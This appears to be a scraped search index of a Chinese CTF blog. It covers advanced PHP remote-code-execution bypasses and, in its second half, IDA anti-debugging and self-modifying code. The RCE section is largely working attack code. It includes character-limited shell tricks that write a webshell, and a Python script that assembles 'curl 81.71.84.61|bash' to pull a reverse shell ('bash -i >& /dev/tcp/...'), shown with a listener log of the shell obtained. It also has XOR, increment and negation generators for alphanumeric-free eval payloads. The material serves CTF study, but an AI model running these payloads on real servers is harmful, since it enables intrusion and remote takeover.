-\\\\ \u003ee64\\\\ \u003ebas\\\\ \u003e7\\|\\\\ \u003eXSk\\\\ \u003eFsx\\\\ \u003edFV\\\\ \u003ekX0\\\\ \u003ebCg\\\\ \u003eXZh\\\\ \u003eAgZ\\\\ \u003ewaH\\\\ \u003ePD9\\\\ \u003eo\\ \\\\ \u003eech\\\\ ls -t\u003e0 sh 0 用python打payload，把上面的payload写入execpayload.txt里面 import requests url = \"http://xxxxx/index.php?cmd={0}\" print(\"[+]start attack!!!\") with open(\"execpayload.txt\", \"r\") as f: for i in f: print(\"[*]\" + url.format(i.strip())) requests.get(url.format(i.strip())) 最终会在目录下生成1.php，里面就是一句话木马 如果是五位字符限制，则最后用 \u003els\\\\ ls\u003ea \u003e\\ \\\\ \u003e-t\\\\ \u003e\\\u003e0 ls\u003e\u003ea sh a 四位： \u003ef\\\u003e \u003eht- \u003esl \u003edir *\u003ev \u003erev *v\u003e0 cat 0 这里是利用Linux的命令特性，起初在windows下搭建的环境需要修改成windows的终端命令 ","date":"2023-11-17","objectID":"/rce_advanced/:0:1","series":null,"tags":["web","manual"],"title":"rce_进阶","uri":"/rce_advanced/#字符数量限制bypass"},{"categories":["web","manual"],"content":"\r无回显rce无回显rce是远程服务器上执行命令后，前段不会显示执行结果。这个时候需要使用curl或反弹shell进行绕过 \u003c?php if(isset($_GET['c'])){ $c=$_GET['c']; system($c.\" \u003e/dev/null 2\u003e\u00261\"); }else{ highlight_file(__FILE__); } 无回显可以通过增加参数sleep进行判断 ls|sleep 10 如返回时间有明显差异，则代表命令执行成功。 对于无参数RCE，可以使用反弹shell ","date":"2023-11-17","objectID":"/rce_advanced/:0:2","series":null,"tags":["web","manual"],"title":"rce_进阶","uri":"/rce_advanced/#无回显rce"},{"categories":["web","manual"],"content":"\r字符数量限制bypass2curl反弹shell：利用curl的反弹shell技巧，构造反弹shell语句，利用curl 访问目标地址|hash，执行目标地址上的反弹shell语句。 例题： \u003c?php error_reporting(E_ALL); $sandbox = dirname(__FILE__).'/sandbox_' . md5(\"orange\" . $_SERVER['REMOTE_ADDR']); mkdir($sandbox,0755,true); chdir($sandbox); if (isset($_GET['cmd']) \u0026\u0026 strlen($_GET['cmd']) \u003c= 6) { exec($_GET['cmd']); } else if (isset($_GET['reset'])) { exec('/bin/rm -rf ' . $sandbox); } highlight_file(__FILE__); 利用vps，搭建80服务，存入反弹shell的语句，效果如下： 访问：http://81.71.84.61/ 显示：bash -i \u003e\u0026 /dev/tcp/219.152.63.100/8000 0\u003e\u00261 利用linux特性写入一句话木马，由于限制字符数量限制，此处分开两部分执行。 用于接收shell的机器要开启端口监听 nc -lv 8000 第一部分： \u003els\\\\ ls\u003e_ \u003e\\ \\\\ \u003e-t\\\\ \u003e\\\u003ey ls\u003e\u003e_ 此部分主要是分两段，写入文件_中。首先写入ls字符，然后追加写入-t \u003ey，这样执行sh _，即执行ls -t \u003ey。此语句等于0x09的ls -t\u003e0 第二部分： 构造curl 81.71.84.61|bash（curl访问这个地址即返回bash -i \u003e\u0026 /dev/tcp/219.152.63.100/8000 0\u003e\u00261这句话），从而执行反弹shell \"\u003ebash\", \"\u003e\\|\\\\\", \"\u003e61\\\\\", \"\u003e84.\\\\\", \"\u003e71.\\\\\", \"\u003e81.\\\\\", \"\u003e\\ \\\\\", \"\u003erl\\\\\", \"\u003ecu\\\\\" 由于有字符限制，所以按照上述拆分。 最后，执行sh _，然后执行sh y 即可 具体python代码如下： import requests baseurl = \"http://81.71.84.61:50002/?cmd=\" reset = \"http://81.71.84.61:50002/?reset\" s = requests.session() s.get(reset) # 将ls -t 写入文件_ list=[ \"\u003els\\\\\", \"ls\u003e_\", \"\u003e\\ \\\\\", \"\u003e-t\\\\\", \"\u003e\\\u003ey\", \"ls\u003e\u003e_\" ] # curl 120.79.33.253|bash # curl 219.152.63.100|bash # curl 81.71.84.61|bash list2=[ \"\u003ebash\", \"\u003e\\|\\\\\", \"\u003e61\\\\\", \"\u003e84.\\\\\", \"\u003e71.\\\\\", \"\u003e81.\\\\\", \"\u003e\\ \\\\\", \"\u003erl\\\\\", \"\u003ecu\\\\\" ] for i in list: url = baseurl+str(i) s.get(url) for j in list2: url = baseurl+str(j) s.get(url) s.get(baseurl+\"sh _\") s.get(baseurl+\"sh y\") #s.get(reset) 效果如下： [root@gr8oqhchd ~]# nc -lv 8000 Ncat: Version 7.50 ( https://nmap.org/ncat ) Ncat: Listening on :::8000 Ncat: Listening on 0.0.0.0:8000 Ncat: Connection from 81.71.84.61. Ncat: Connection from 81.71.84.61:43998. bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell www-data@314b51:~/html/sandbox_92f06c44fa329edc79eafc1eb$ ls / ls / bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var www-data@314b51:~/html/sandbox_92f06c44fa329edc79eafc1eb$ ","date":"2023-11-17","objectID":"/rce_advanced/:0:3","series":null,"tags":["web","manual"],"title":"rce_进阶","uri":"/rce_advanced/#字符数量限制bypass2"},{"categories":["web","manual"],"content":"\r无字母数字rce以下三种方法可以用来解决类似这种无字母数字rce \u003c?php highlight_file(__FILE__); $code = $_POST['code']; if(preg_match(\"/[A-Za-z0-9]+/\",$code)){ die(\"hacker!\"); } @eval($code); ?\u003e ","date":"2023-11-17","objectID":"/rce_advanced/:1:0","series":null,"tags":["web","manual"],"title":"rce_进阶","uri":"/rce_advanced/#无字母数字rce"},{"categories":["web","manual"],"content":"\r异域构造 $__=(\"#\"^\"|\"); // _ $__.=(\".\"^\"~\"); // _P $__.=(\"/\"^\"`\"); // _PO $__.=(\"|\"^\"/\"); // _POS $__.=(\"{\"^\"/\"); // _POST $$__[_]($$__[__]); // $_POST[_]($_POST[__]); 随后合并并编码得到： %24__%3D(%22%23%22%5E%22%7C%22)%3B%24__.%3D(%22.%22%5E%22~%22)%3B%24__.%3D(%22%2F%22%5E%22%60%22)%3B%24__.%3D(%22%7C%22%5E%22%2F%22)%3B%24__.%3D(%22%7B%22%5E%22%2F%22)%3B%24%24__%5B_%5D(%24%24__%5B__%5D)%3B 搭建本地环境进行测试 由于本地是Windows环境，所以执行的命令是dir payload： code=%24__%3D(%22%23%22%5E%22%7C%22)%3B%24__.%3D(%22.%22%5E%22~%22)%3B%24__.%3D(%22%2F%22%5E%22%60%22)%3B%24__.%3D(%22%7C%22%5E%22%2F%22)%3B%24__.%3D(%22%7B%22%5E%22%2F%22)%3B%24%24__%5B_%5D(%24%24__%5B__%5D)%3B\u0026_=system\u0026__=dir 我们可以通过脚本来实现构造 import re import requests import urllib from sys import * import os a=[] ans1=\"\" ans2=\"\" for i in range(0,256): #设置i的范围 c=chr(i) #将i转换成ascii对应的字符，并赋值给c tmp = re.match(r'[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026|\\-',c,re.I) #设置过滤条件，让变量c在其中找对应，并利用修饰符过滤大小写，这样可以得到未被过滤的字符 if(tmp): continue #当执行正确时，那说明这些是被过滤掉的，所以才会被匹配到，此时我们让他继续执行即可 else: a.append(i) #在数组中增加i，这些就是未被系统过滤掉的字符 # eval(\"echo($c);\"); mya=\"system\" #函数名 这里修改！ myb=\"dir\" #参数 def myfun(k,my): #自定义函数 global ans1 #引用全局变量ans1，使得在局部对其进行更改时不会报错 global ans2 #引用全局变量ans2，使得在局部对其进行更改时不会报错 for i in range (0,len(a)): #设置循环范围为（0，a）注：a为未被过滤的字符数量 for j in range(i,len(a)): #在上个循环的条件下设置j的范围 if(a[i]^a[j]==ord(my[k])): ans1+=chr(a[i]) #ans1=ans1+chr(a[i]) ans2+=chr(a[j]) #ans2=ans2+chr(a[j]) return;#返回循环语句中，重新寻找第二个k，这里的话就是寻找y对应的两个字符 for x in range(0,len(mya)): #设置k的范围 myfun(x,mya)#引用自定义的函数 data1=\"('\"+urllib.request.quote(ans1)+\"'^'\"+urllib.request.quote(ans2)+\"')\" #data1等于传入的命令,\"+ans1+\"是固定格式，这样可以得到变量对应的值，再用'包裹，这样是变量的固定格式，另一个也是如此，两个在进行URL编码后进行按位与运算，然后得到对应值 print(data1) ans1=\"\"#对ans1进行重新赋值 ans2=\"\"#对ans2进行重新赋值 for k in range(0,len(myb)):#设置k的范围为(0,len(myb)) myfun(k,myb)#再次引用自定义函数 data2=\"(\\\"\"+urllib.request.quote(ans1)+\"\\\"^\\\"\"+urllib.request.quote(ans2)+\"\\\")\" print(data2) 构造system(‘dir’); payload: code=('%0C%05%0C%08%05%0D'^'%7F%7C%7F%7C%60%60')(\"%04%09%0D\"^\"%60%60%7F\"); ","date":"2023-11-17","objectID":"/rce_advanced/:1:1","series":null,"tags":["web","manual"],"title":"rce_进阶","uri":"/rce_advanced/#异域构造"},{"categories":["web","manual"],"content":"\r自增构造 \u003c?php $_=[].'';//Array $_=$_[''=='$'];//A $_++;//B $_++;//C $_++;//D $_++;//E $__=$_;//E $_++;//F $_++;//G $___=$_;//G $_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;//T $_=$___.$__.$_;//GET //var_dump($_); $_='_'.$_;//_GET var_dump($$_[_]($$_[__])); //$_GET[_]($_GET[__]) 随后可以尝试给_和__进行GET传参，我们把换行去掉，然后进行一次URL编码（中间件会解码一次），所以我们构造的payload先变成这样： $_=[].'';$_=$_[''=='$'];$_++;$_++;$_++;$_++;$__=$_;$_++;$_++;$___=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_=$___.$__.$_;$_='_'.$_;$$_[_]($$_[__]); 编码之后 %24_%3D%5B%5D.''%3B%24_%3D%24_%5B''%3D%3D'%24'%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24___.%24__.%24_%3B%24_%3D'_'.%24_%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B 然后传参\u0026_=system\u0026__=dir; 如果是POST传参方式也可以这样： 在自增中，可以通过特殊字符构造出字符串的有以下几种方式 [].'' //Array (0/0).'' //NAN (1/0).'' //INF 如果ban了数字： a/a //NAN _/_ //NAN INF //1/a ","date":"2023-11-17","objectID":"/rce_advanced/:1:2","series":null,"tags":["web","manual"],"title":"rce_进阶","uri":"/rce_advanced/#自增构造"},{"categories":["web","manual"],"content":"\r取反构造利用不可见字符，进行两次取反,得到的还是其本身。当我们进行一次取反过后，对其进行URL编码，再对其进行取反，此时可以得到可见的字符，它的本质其实还是这个字符本身，然后因为取反用的多是不可见字符，所以这里就达到了一种绕过的目的。 这里的话利用一个php脚本即可获取我们想要的字符 \u003c?php $ans1='system';//函数名 $ans2='dir';//命令 $data1=('~'.urlencode(~$ans1));//通过两次取反运算得到system $data2=('~'.urlencode(~$ans2));//通过两次取反运算得到dir echo ('('.$data1.')'.'('.$data2.')'.';'); 本地测试 然后 参考： CTF随笔-RCE进阶 ","date":"2023-11-17","objectID":"/rce_advanced/:1:3","series":null,"tags":["web","manual"],"title":"rce_进阶","uri":"/rce_advanced/#取反构造"},{"categories":["Reverse","notes"],"content":"reverse反调试基础 ","date":"2023-11-17","objectID":"/reverse-antidbg/:0:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#"},{"categories":["Reverse","notes"],"content":"\r关于反调试分为静态反调试和动态反调试 ","date":"2023-11-17","objectID":"/reverse-antidbg/:0:1","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#关于反调试"},{"categories":["Reverse","notes"],"content":"\r调试常用的工具IDA Pro Ollydbg peid(查壳工具) ","date":"2023-11-17","objectID":"/reverse-antidbg/:0:2","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#调试常用的工具"},{"categories":["Reverse","notes"],"content":"\r一.栈指针平衡\rESP寄存器指向当前栈顶元素的地址，是栈操作的重要寄存器。 EBP寄存器通常用于指向当前函数的基址（起始地址）或堆栈帧的基址。 当我们用IDA进行静态分析，用F5进行反编译的时候，会出现如下这种报错： sp：stack pointer 栈指针 为解决这个问题，我们首先要清除是什么地方导致栈指针不平衡，根据报错： 找到这个地方之后，要进行栈指针分析，此时要设置一下IDA，让其显示栈指针Options-General-Disassembly-\"Stack pointer\" 栈的生命周期结束后，ESP和EBP寄存器的值会恢复到它们在函数调用前的值 然而，我们看到的这个pop指令后的栈指针与入栈的栈指针不一致 这就引起了栈指针不平衡，因此我们需要手动调节栈指针，让其恢复平衡 Attention：每条语句前的栈指针是这条语句未执行的栈指针 我们在IDA中使用Alt+k可以修改栈指针 修改后的值为：0X21E-0X4 = 0X21A (然而，根据大佬在博客中的解释，栈指针不平衡可能是IDA的一个漏洞) IDA有栈跟踪的功能，它在函数内部遇到ret(retn)指令时会做判断：栈指针的值在函数的开头/结尾是否一致，如果不一致就会在函数的结尾标注\"sp-analysis failed\"。一般编程中，不同的函数调用约定(如stdcall\u0026_cdcel call)可能会出现这种情况；另外，为了实现代码保护而加入代码混淆(特指用push/push+ret实现函数调用)技术也会出现这种情况。 我看的这篇文章是2019年发布的，或许当年的IDA还有这方面缺陷，然而我下载了其博客中的附件进行复现的时候，发现并没有其博客中出现的问题，可以直接进行反编译，或许是新版本的IDA进行了自动修复 ","date":"2023-11-17","objectID":"/reverse-antidbg/:1:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#一栈指针平衡"},{"categories":["Reverse","notes"],"content":"\r二.花指令","date":"2023-11-17","objectID":"/reverse-antidbg/:2:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#二花指令"},{"categories":["Reverse","notes"],"content":"\r0x1 花指令概述​ 在正常的代码流程中通过内联汇编或者插入机器码的方式来干扰指令执行的顺序，从而影响反汇编引擎的工作，导致反汇编工具难以正确地识别代码 ​ 是反静态调试的一种手段，从而加大逆向分析难度 ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:1","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x1-花指令概述"},{"categories":["Reverse","notes"],"content":"\r0x2 花指令又是怎样影响栈指针的我们可以写一个简单的花指令，来分析其如何影响栈指针的 asm指令的作用：用于调用内联汇编程序，并且可在C或C++语句合法时出现，asm后跟一个程序指令集、一组括在大括号中的指令集或者至少一堆空大括号 emit指令的作用： 编译器不认识的指令，拆成机器码来写。 插入垃圾字节来反跟踪，又称花指令。 用emit就是在当前位置直接插入数据（实际上是指令），一般是用来直接插入汇编里面没有的特殊指令，多数指令可以用asm内嵌汇编来做，没有必要用emit来做，除非你不想让其它人看懂你的代码。 将改程序编译成exe，然后用IDA进行反编译，之后双击访问func2();,产生栈指针不平衡报错，以此可以达到反跟踪的目的 在编程语言中，通常以一个下划线开头的函数或变量名表示该函数或变量是库或系统的内部实现，不应该在用户代码中直接使用。这种命名约定通常被称为“前缀保留”。 有些编程语言还使用了双下划线前缀来表示特殊含义，例如： attribute：在C和C++中，__attribute__关键字用于指定变量或函数的属性，例如对齐方式、强制inline等。 __init和__exit：在Linux内核中，这些函数是内核模块初始化和清理函数的标准名称。 需要注意的是，使用双下划线前缀是非标准的命名约定，因此在编写代码时应该尽可能避免使用这种方式，以免与标准库或系统库的命名冲突。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:2","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x2-花指令又是怎样影响栈指针的"},{"categories":["Reverse","notes"],"content":"\r0x3 花指令分类\r可执行花指令​ 1.可执行花指令指的是这部分花指令代码在程序的正常执行过程中会被执行，但执行这些代码没有任何意义，执行前后不会改变寄存器的值(eip这种除外)，同时这部分代码也会被反汇编器正常识别。 ​ 2.花指令的首要目的是加大静态分析的难度，让你难以识别代码的真正意图，同时可以破坏范斌已的分析，使得栈指针在反编译引擎中出现异常。 不可执行花指令​ 1.花指令虽然被插入到了正常的代码中间，但是并不意味着一定会得到执行，这类花指令通常形式为在代码中出现了类似数据的代码，或者IDA反汇编后为jmupout(xxxxx). ​ 2.这类花指令一般不属于CPU可以识别的操作码，那么就需要在上面用跳转跳过这些花指令才能保证程序正常运行。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:3","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x3-花指令分类"},{"categories":["Reverse","notes"],"content":"\r0x3 花指令分类\r可执行花指令​ 1.可执行花指令指的是这部分花指令代码在程序的正常执行过程中会被执行，但执行这些代码没有任何意义，执行前后不会改变寄存器的值(eip这种除外)，同时这部分代码也会被反汇编器正常识别。 ​ 2.花指令的首要目的是加大静态分析的难度，让你难以识别代码的真正意图，同时可以破坏范斌已的分析，使得栈指针在反编译引擎中出现异常。 不可执行花指令​ 1.花指令虽然被插入到了正常的代码中间，但是并不意味着一定会得到执行，这类花指令通常形式为在代码中出现了类似数据的代码，或者IDA反汇编后为jmupout(xxxxx). ​ 2.这类花指令一般不属于CPU可以识别的操作码，那么就需要在上面用跳转跳过这些花指令才能保证程序正常运行。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:3","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#可执行花指令"},{"categories":["Reverse","notes"],"content":"\r0x3 花指令分类\r可执行花指令​ 1.可执行花指令指的是这部分花指令代码在程序的正常执行过程中会被执行，但执行这些代码没有任何意义，执行前后不会改变寄存器的值(eip这种除外)，同时这部分代码也会被反汇编器正常识别。 ​ 2.花指令的首要目的是加大静态分析的难度，让你难以识别代码的真正意图，同时可以破坏范斌已的分析，使得栈指针在反编译引擎中出现异常。 不可执行花指令​ 1.花指令虽然被插入到了正常的代码中间，但是并不意味着一定会得到执行，这类花指令通常形式为在代码中出现了类似数据的代码，或者IDA反汇编后为jmupout(xxxxx). ​ 2.这类花指令一般不属于CPU可以识别的操作码，那么就需要在上面用跳转跳过这些花指令才能保证程序正常运行。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:3","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#不可执行花指令"},{"categories":["Reverse","notes"],"content":"\r0x3 一点点收集\r1.简单的花指令0xe8是跳转指令，可以对线性扫描算法进行干扰，但是递归扫描算法可以正常分析。 jz，jnz意味着无论如何都将跳转到labell这个无效数据 2.简单的jmpPD能被骗过去，但是因为IDA采用的是递归扫描算法所以能够正常识别 #include\u003cstdio.h\u003e int main() { __asm{ jmp label1; __emit 0xe8; label1: } printf(\"Hello World!\"); return 0; } ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:4","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x3-一点点收集"},{"categories":["Reverse","notes"],"content":"\r0x3 一点点收集\r1.简单的花指令0xe8是跳转指令，可以对线性扫描算法进行干扰，但是递归扫描算法可以正常分析。 jz，jnz意味着无论如何都将跳转到labell这个无效数据 2.简单的jmpPD能被骗过去，但是因为IDA采用的是递归扫描算法所以能够正常识别 #include int main() { __asm{ jmp label1; __emit 0xe8; label1: } printf(\"Hello World!\"); return 0; } ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:4","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#1简单的花指令"},{"categories":["Reverse","notes"],"content":"\r0x3 一点点收集\r1.简单的花指令0xe8是跳转指令，可以对线性扫描算法进行干扰，但是递归扫描算法可以正常分析。 jz，jnz意味着无论如何都将跳转到labell这个无效数据 2.简单的jmpPD能被骗过去，但是因为IDA采用的是递归扫描算法所以能够正常识别 #include int main() { __asm{ jmp label1; __emit 0xe8; label1: } printf(\"Hello World!\"); return 0; } ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:4","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#2简单的jmp"},{"categories":["Reverse","notes"],"content":"\r3.多级跳转 #include\u003cstdio.h\u003e int main() { __asm{ start://花指令开始 jmp label1; __emit 0xe8; label1: jmp label2; __emit 0xe8; label2: jmp label3; __emit 0xe8; label3: } printf(\"Hello World!\"); return 0; } ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:5","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#3多级跳转"},{"categories":["Reverse","notes"],"content":"\r4.call\u0026ret构造花指令 __asm{ call label1 _emit junkcode label1: add dword ptr ss:[esp],8//具体增加多少根据调试来 ret _emit junkcode } call指令：将下一条指令地址压入栈，再跳转执行 ret指令：将保存的地址取出，跳转执行 ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:6","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#4callret构造花指令"},{"categories":["Reverse","notes"],"content":"\r0x4 如何处理\r1.手动清除找到所有的花指令，重新设置数据和代码地址。或者将花指令设置为nop（0x90） 在0x401051设置为数据类型（快捷键D）,在0x401052设置为代码类型（快捷键C） 这里用一个ida python脚本添加ALT+N快捷键来将指令的第一个字节设置为NOP from idaapi import * from idc import * def nopIt(): start = get_screen_ea() patch_byte(start,0x90) refresh_idaview_anyway() add_hotkey(\"alt-N\",nopIt) 2.自动清楚花指令上面有3个类别ida无法正常识别 互补条件跳转（比较好处理） 永真条件跳转 （各种永真条件比较难匹配） call\u0026ret跳转（比较难处理） 所以就只对第一种jnx和jx的花指令进行自动化处理 所有的跳转指令，互补跳转指令只有最后一个bit位不同 70 \u003c–\u003e JO(O标志位为1跳转) 71 \u003c–\u003e JNO 72 \u003c–\u003e JB/JNAE/JC 73 \u003c–\u003e JNB/JAE/JNC 74 \u003c–\u003e JZ/JE 75 \u003c–\u003e JNZ/JNE 76 \u003c–\u003e JBE/JNA 77 \u003c–\u003e JNBE/JA 78 \u003c–\u003e JS 79 \u003c–\u003e JNS 7A \u003c–\u003e JP/JPE 7B \u003c–\u003e JNP/JPO 7C \u003c–\u003e JL/JNGE 7D \u003c–\u003e JNL/JGE 7E \u003c–\u003e JLE/JNG 7F \u003c–\u003e JNLE/JG 第一条指令跳转距离=第二条跳转距离+2。简单一点可以是\\x03和\\x01 抄的代码 from ida_bytes import get_bytes,patch_bytes start= 0x401000#start addr end = 0x422000 buf = get_bytes(start,end-start) def patch_at(p,ln): global buf buf = buf[:p]+b\"\\x90\"*ln+buf[p+ln:] fake_jcc=[] for opcode in range(0x70,0x7f,2): pattern = chr(opcode)+\"\\x03\"+chr(opcode|1)+\"\\x01\" fake_jcc.append(pattern.encode()) pattern = chr(opcode|1)+\"\\x03\"+chr(opcode)+\"\\x01\" fake_jcc.append(pattern.encode()) print(fake_jcc) for pattern in fake_jcc: p = buf.find(pattern) while p != -1: patch_at(p,5) p = buf.find(pattern,p+1) patch_bytes(start,buf) print(\"Done\") ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:7","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x4-如何处理"},{"categories":["Reverse","notes"],"content":"\r0x4 如何处理\r1.手动清除找到所有的花指令，重新设置数据和代码地址。或者将花指令设置为nop（0x90） 在0x401051设置为数据类型（快捷键D）,在0x401052设置为代码类型（快捷键C） 这里用一个ida python脚本添加ALT+N快捷键来将指令的第一个字节设置为NOP from idaapi import * from idc import * def nopIt(): start = get_screen_ea() patch_byte(start,0x90) refresh_idaview_anyway() add_hotkey(\"alt-N\",nopIt) 2.自动清楚花指令上面有3个类别ida无法正常识别 互补条件跳转（比较好处理） 永真条件跳转 （各种永真条件比较难匹配） call\u0026ret跳转（比较难处理） 所以就只对第一种jnx和jx的花指令进行自动化处理 所有的跳转指令，互补跳转指令只有最后一个bit位不同 70 \u003c–\u003e JO(O标志位为1跳转) 71 \u003c–\u003e JNO 72 \u003c–\u003e JB/JNAE/JC 73 \u003c–\u003e JNB/JAE/JNC 74 \u003c–\u003e JZ/JE 75 \u003c–\u003e JNZ/JNE 76 \u003c–\u003e JBE/JNA 77 \u003c–\u003e JNBE/JA 78 \u003c–\u003e JS 79 \u003c–\u003e JNS 7A \u003c–\u003e JP/JPE 7B \u003c–\u003e JNP/JPO 7C \u003c–\u003e JL/JNGE 7D \u003c–\u003e JNL/JGE 7E \u003c–\u003e JLE/JNG 7F \u003c–\u003e JNLE/JG 第一条指令跳转距离=第二条跳转距离+2。简单一点可以是\\x03和\\x01 抄的代码 from ida_bytes import get_bytes,patch_bytes start= 0x401000#start addr end = 0x422000 buf = get_bytes(start,end-start) def patch_at(p,ln): global buf buf = buf[:p]+b\"\\x90\"*ln+buf[p+ln:] fake_jcc=[] for opcode in range(0x70,0x7f,2): pattern = chr(opcode)+\"\\x03\"+chr(opcode|1)+\"\\x01\" fake_jcc.append(pattern.encode()) pattern = chr(opcode|1)+\"\\x03\"+chr(opcode)+\"\\x01\" fake_jcc.append(pattern.encode()) print(fake_jcc) for pattern in fake_jcc: p = buf.find(pattern) while p != -1: patch_at(p,5) p = buf.find(pattern,p+1) patch_bytes(start,buf) print(\"Done\") ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:7","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#1手动清除"},{"categories":["Reverse","notes"],"content":"\r0x4 如何处理\r1.手动清除找到所有的花指令，重新设置数据和代码地址。或者将花指令设置为nop（0x90） 在0x401051设置为数据类型（快捷键D）,在0x401052设置为代码类型（快捷键C） 这里用一个ida python脚本添加ALT+N快捷键来将指令的第一个字节设置为NOP from idaapi import * from idc import * def nopIt(): start = get_screen_ea() patch_byte(start,0x90) refresh_idaview_anyway() add_hotkey(\"alt-N\",nopIt) 2.自动清楚花指令上面有3个类别ida无法正常识别 互补条件跳转（比较好处理） 永真条件跳转 （各种永真条件比较难匹配） call\u0026ret跳转（比较难处理） 所以就只对第一种jnx和jx的花指令进行自动化处理 所有的跳转指令，互补跳转指令只有最后一个bit位不同 70 \u003c–\u003e JO(O标志位为1跳转) 71 \u003c–\u003e JNO 72 \u003c–\u003e JB/JNAE/JC 73 \u003c–\u003e JNB/JAE/JNC 74 \u003c–\u003e JZ/JE 75 \u003c–\u003e JNZ/JNE 76 \u003c–\u003e JBE/JNA 77 \u003c–\u003e JNBE/JA 78 \u003c–\u003e JS 79 \u003c–\u003e JNS 7A \u003c–\u003e JP/JPE 7B \u003c–\u003e JNP/JPO 7C \u003c–\u003e JL/JNGE 7D \u003c–\u003e JNL/JGE 7E \u003c–\u003e JLE/JNG 7F \u003c–\u003e JNLE/JG 第一条指令跳转距离=第二条跳转距离+2。简单一点可以是\\x03和\\x01 抄的代码 from ida_bytes import get_bytes,patch_bytes start= 0x401000#start addr end = 0x422000 buf = get_bytes(start,end-start) def patch_at(p,ln): global buf buf = buf[:p]+b\"\\x90\"*ln+buf[p+ln:] fake_jcc=[] for opcode in range(0x70,0x7f,2): pattern = chr(opcode)+\"\\x03\"+chr(opcode|1)+\"\\x01\" fake_jcc.append(pattern.encode()) pattern = chr(opcode|1)+\"\\x03\"+chr(opcode)+\"\\x01\" fake_jcc.append(pattern.encode()) print(fake_jcc) for pattern in fake_jcc: p = buf.find(pattern) while p != -1: patch_at(p,5) p = buf.find(pattern,p+1) patch_bytes(start,buf) print(\"Done\") ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:7","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#2自动清楚花指令"},{"categories":["Reverse","notes"],"content":"\r三.SMC自解码SMC（Self-Modifying Code）（自解码），可以在一段代码执行前对它进行修改。 常常利用这个特性，把代码以加密的形式保存在可自行文件中，然后在程序执行的时候进行动态解析。这样我们在采用静态分析时，看到的都是加密的内容，从而阻断了静态调试的可能性。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:3:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#三smc自解码"},{"categories":["Reverse","notes"],"content":"\rsms题目静态分析拿到题目，找到main函数，进行反编译 进行代码审计，然而，能传参的肯定是函数，分析byte_403020这个函数，双击跟进 然而得到的确实一堆数据，而不是函数。这就是典型的对某段代码进行了加密处理，上面的异或操作既是加密操作也是也解密操作，这样我们静态分析就进行不下去了。这样的情况就是SMC自解码问题。 解决此类问题，就要进行动态分析 ","date":"2023-11-17","objectID":"/reverse-antidbg/:3:1","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#sms题目静态分析"},{"categories":["Reverse","notes"],"content":"\rsms题目动态分析使用OllyDbg找到主函数，开始单步执行 大部分的逻辑就是下面注释的地方，我们需要关注的重点在于找到处理输入函数的地方，看看在解密后的那个函数是怎样对输入内容进行比较或者变换的 当运行到这个地步的时候，我们就发现函数快运行到结束了 在函数结束之前，调用了EAX，其实就是解密后的函数。这个地方就是我们静态分析想要分析的地方。因此，在这里我们就可以跟进去。因为现在那个数组经过解密后已经是一个函数了。 进入之后我们就发现了比较的指令。看看比较的内容，翻译一下就是BUPT{ 总的来说，就是需要通过程序调试，进行单步执行，当程序执行到解码的步骤时，就会对主程序进行解码运行，静态状态是加密的。 